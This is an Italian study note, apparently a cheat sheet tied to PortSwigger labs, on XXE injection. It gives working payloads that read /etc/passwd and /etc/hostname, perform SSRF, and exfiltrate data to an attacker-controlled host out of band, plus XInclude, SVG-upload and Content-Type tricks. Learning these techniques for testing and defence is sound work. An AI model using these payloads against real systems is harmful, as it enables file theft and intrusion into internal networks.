#Exploit_noti 

- [[#Retrieve Files]]
- [[#SSRF]]
- [[#Out-of-Band]]
- [[#XInclude]]
- [[#File Upload]]
- [[#Content-Type Header]]
# Descrizione

L'**XML External Entity Injection** (nota anche come **XXE**) è una vulnerabilità di sicurezza web che consente a un attaccante di interferire con l'elaborazione dei dati XML da parte di un'applicazione. Spesso permette a un attaccante di visualizzare file presenti sul file system del server applicativo e di interagire con qualsiasi sistema back-end o esterno a cui l'applicazione può accedere.

# Retrieve Files 

Per eseguire un attacco di **XXE injection** che recupera un file arbitrario dal file system del server, è necessario **modificare l'XML inviato** in due modi:
1. **Introdurre (o modificare)** un elemento `DOCTYPE` che definisce un'entità esterna contenente il percorso del file.
2. **Modificare un valore di dato** nell'XML, che viene restituito nella risposta dell'applicazione, per utilizzare l'entità esterna definita. ([writeup](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files))

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
</stockCheck>
```


# SSRF

Le vulnerabilità XXE possono essere usate anche per performare **attacchi di SSRF** ([writeup](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)):

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
<stockCheck>
	<productId>
		&xxe;
	</productId>
</stockCheck>
```

# Out-of-Band

Puoi spesso rilevare un **blind XXE** utilizzando la stessa tecnica degli attacchi **XXE SSRF**, ma inducendo l'interazione di rete **out-of-band** verso un sistema che controlli ([writeup](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)).

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
</stockCheck>
```

In altri scenari il contenuto rubato viene inviato a un server **controllato dall’attaccante** ([writeup](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)).

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://SITO-CONTROLLATO-DALL'ATTACCANTE/?x=%file;'>">
%eval;
%exfil;
```


# XInclude

Un attacco **XInclude** sfrutta l'inclusione di file esterni in documenti XML. Quando un'applicazione inserisce input utente all'interno di un XML (es. SOAP), l'attaccante può iniettare un **payload XInclude.** Questo permette di caricare file locali (es. `/etc/passwd`) senza bisogno di modificare il DOCTYPE. Si sfrutta il namespace `xi` e l'elemento `<xi:include>` per esfiltrare dati sensibili ([writeup](https://portswigger.net/web-security/xxe/lab-xinclude-attack)).

```
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
```

# File Upload

Alcune applicazioni permettono agli utenti di **caricare file**, che vengono poi **elaborati lato server**.  
Alcuni formati di file comuni **usano XML** o contengono **sottocomponenti XML**. Esempi di formati basati su XML includono documenti Office come **DOCX** e formati immagine come **SVG** ([writeup](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)).

```
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
```

# Content-Type Header

La maggior parte delle richieste **POST** utilizza un **content type predefinito** generato dai moduli HTML, come `application/x-www-form-urlencoded`.  
Alcuni siti web si aspettano di ricevere richieste in questo formato, ma **accettano anche altri tipi di contenuto**, inclusi quelli in **XML**.

Ad esempio, se una richiesta normale è così:

```
`POST /action HTTP/1.0   Content-Type: application/x-www-form-urlencoded  Content-Length: 7  foo=bar`
```

Potresti invece inviare questa richiesta, ottenendo **lo stesso risultato funzionale**:

```
`POST /action HTTP/1.0   Content-Type: text/xml   Content-Length: 52    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`
```

Se l’applicazione **accetta richieste XML nel body** e analizza il contenuto come XML, puoi accedere a **superfici di attacco XXE nascoste** semplicemente **riformattando la richiesta** per usare il formato XML.